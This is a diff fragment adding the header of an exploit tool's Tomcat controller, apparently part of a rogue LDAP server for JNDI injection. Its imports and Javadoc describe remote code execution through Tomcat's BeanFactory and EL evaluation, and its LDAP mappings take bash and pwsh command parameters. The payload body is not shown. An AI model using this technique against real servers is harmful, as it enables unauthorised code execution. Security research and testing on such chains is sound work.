@@ -1,3 +1,33 @@
+package artsploit.controllers;
+
+import java.util.Base64;
+import artsploit.Config;
+import artsploit.annotations.LdapMapping;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import org.apache.naming.ResourceRef;
+
+import javax.naming.StringRefAddr;
+
+import static artsploit.Utilities.serialize;
+
+/**
+ * Yields:
+ *  RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
+ *  When bean is created on the server side, we can control its class name and setter methods,
+ *   so we can leverage {@link javax.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
+ *
+ * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
+ *
+ * Requires:
+ *  Tomcat 8+ or SpringBoot 1.2.x+ in classpath
+ *  - tomcat-embed-core.jar
+ *  - tomcat-embed-el.jar
+ *
+ * @author artsploit
+ */
 @LdapMapping(uri = { "/o=tomcat", "/o=tomcat,pwsh=*", "/o=tomcat,bash=*" })
 public class Tomcat implements LdapController {
 
